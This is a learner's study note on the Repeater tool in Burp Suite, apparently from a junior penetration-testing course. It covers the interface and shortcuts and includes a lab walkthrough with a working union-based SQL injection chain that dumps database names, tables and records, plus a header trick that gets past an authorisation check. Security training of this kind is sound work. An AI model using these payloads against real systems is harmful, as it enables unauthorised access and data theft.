# Burp Suite: Repeater
**Path:** Jr Penetration Tester - Burp Suite
**Date:** 2026-03-28
**Difficulty:** Easy

---

## What is Repeater

Repeater lets you capture, modify, and resend HTTP requests
manually as many times as you want without going through the
browser again. Think of it as a scratchpad for HTTP requests
where you can tweak anything and instantly see the server response.

---

## Basic Usage
```
Proxy → Intercept request → Right-click → Send to Repeater
OR
Any request in HTTP history → Right-click → Send to Repeater
Shortcut: Ctrl+R
```

Once in Repeater:
```
Ctrl+Space or Send button → sends the request
Ctrl+Z                    → undo changes to request
< > arrows                → navigate request history
```

---

## Interface Layout
```
Left panel   → the HTTP request (editable)
Right panel  → the server response (read only)
Top bar      → target IP:PORT shown here
```

Response can be viewed in four ways:
```
Pretty  → formatted, readable HTML/JSON
Raw     → exact bytes the server sent
Hex     → hexadecimal view (useful for binary data)
Render  → renders HTML visually like a browser
```

---

## Message Analysis Toolbar

Sits above both request and response panels.
```
Pretty   → auto-formats the content (HTML, JSON, XML)
Raw      → unformatted exact content
Hex      → hex dump view
\n       → toggle to show hidden characters like \r\n
Search   → find specific strings in the response
```

---

## Inspector Panel

Right-side panel that breaks the request into sections
so you can edit individual parts without touching raw text.
```
Request attributes      → method, path, HTTP version
Request query params    → URL parameters (GET)
Request body params     → POST body parameters
Request cookies         → session cookies
Request headers         → all HTTP headers
```

Clicking any value in Inspector opens an inline editor —
easier than editing raw text when you just need to change
one header or cookie value.

---

## Practical Example — SQLi via Repeater

Repeater is ideal for SQL injection because you need to send
many slightly different payloads and observe each response.
```
1. Intercept the request with a parameter you want to test
2. Send to Repeater
3. Modify the parameter value with your SQLi payload
4. Send and check the response for errors or data leakage
5. Tweak payload → send again → repeat
```

Example workflow on the practical task:
```
# Original request
GET /about/2 HTTP/1.1

# Modify ID to test SQLi
GET /about/2' HTTP/1.1       → 500 error = injectable

# Find column count
GET /about/0 UNION SELECT 1,2,3,4,5;-- HTTP/1.1

# Extract DB name
GET /about/0 UNION ALL SELECT 1,2,database(),4,5;-- HTTP/1.1

# Extract tables
GET /about/0 UNION ALL SELECT 1,2,group_concat(table_name),4,5
FROM information_schema.tables WHERE table_schema=database();-- HTTP/1.1

# Extract columns
GET /about/0 UNION ALL SELECT 1,2,group_concat(column_name),4,5
FROM information_schema.columns WHERE table_name='people';-- HTTP/1.1

# Dump data
GET /about/0 UNION ALL SELECT 1,2,group_concat(firstName,':',lastName),4,5
FROM people;-- HTTP/1.1
```

Why /about/0?
→ ID 0 returns no real row so the only result is your injected query.
→ Prevents your data from being hidden behind a real row.

---

## Challenge — FlagAuthorised Header
```
GET / HTTP/1.1
Host: TARGET_IP
FlagAuthorised: True
```
Adding a custom header in Repeater that the server checks for.
Inspector makes this easier — expand Request Headers → Add new header.

---

## Extra Mile Challenge — SQLi + Repeater Full Chain
```
Target:   /about/ID endpoint
Method:   Union-based SQLi via URL path
Goal:     Extract flag from hidden DB table
Steps:
  1. Confirm injection with '
  2. Find column count with UNION SELECT nulls
  3. Find which column reflects in response
  4. Enumerate DB → tables → columns → data
  5. Flag is in a non-obvious table name
```

---

## Why Repeater Over Browser

Browser makes testing painful — every change means filling
forms again, clicking through pages, losing context.
Repeater keeps the full request editable in one place and
shows raw responses instantly. For manual SQLi, XSS testing,
header manipulation, and auth bypass — Repeater is the
primary tool.

---

## Key Shortcuts
```
Ctrl+R    → send selected request to Repeater
Ctrl+G    → send request (in Repeater)
Ctrl+Z    → undo edit
Ctrl+S    → save Repeater tab state
```

---

## Gotchas / Surprises

- Always check the Render tab when response is HTML — raw
  is hard to read for large pages
- Inspector is faster than raw editing for headers and cookies
- URL encode special characters in path-based injection
  e.g. space = %20, # = %23
- /about/0 trick ensures only your injected row returns
- UNION ALL is preferred over UNION in injection — faster
  and doesn't drop rows
- HTTP version matters — some servers behave differently on
  HTTP/1.0 vs HTTP/1.1, try switching if you get odd responses

---

## My Understanding in Plain English

Repeater is essentially a manual HTTP scratchpad. You grab
a request, modify anything you want — headers, parameters,
body, cookies — and fire it as many times as needed while
watching exactly what the server sends back. For SQLi and
auth testing this is invaluable because the browser hides
all of this and makes iteration slow and painful.

---

## Related Notes

- [[Burp-Suite-Basics]]
- [[SQL-Injection]]
- [[Authentication-Bypass]]
- [[Walking-An-Application]]
